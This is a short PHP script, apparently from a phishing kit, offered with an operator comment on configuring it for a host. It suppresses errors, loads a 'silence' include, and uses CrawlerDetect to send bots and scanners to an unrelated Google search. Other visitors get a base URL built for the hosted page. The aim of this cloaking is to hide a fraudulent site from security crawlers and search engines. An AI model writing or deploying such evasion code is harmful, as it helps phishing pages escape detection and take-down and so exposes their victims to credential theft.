<?php
error_reporting(0);
session_start();

require "out/silence.php";

	$CrawlerDetect = new CrawlerDetect;
	
	// Check the user agent of the current 'visitor'
	if($CrawlerDetect->isCrawler()) {
$forre = 'https://www.google.com/search?q=ghost+house&oq=ghost+house&aqs=chrome..69i57.8629j0j7&sourceid=chrome&ie=UTF-8';
header ("Location: $forre");		
 
	} else {
$ht = 'https://'; /* Edit to https// or http:// depending on your host */
$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
$me = $ht.$host.$path;
	}


?>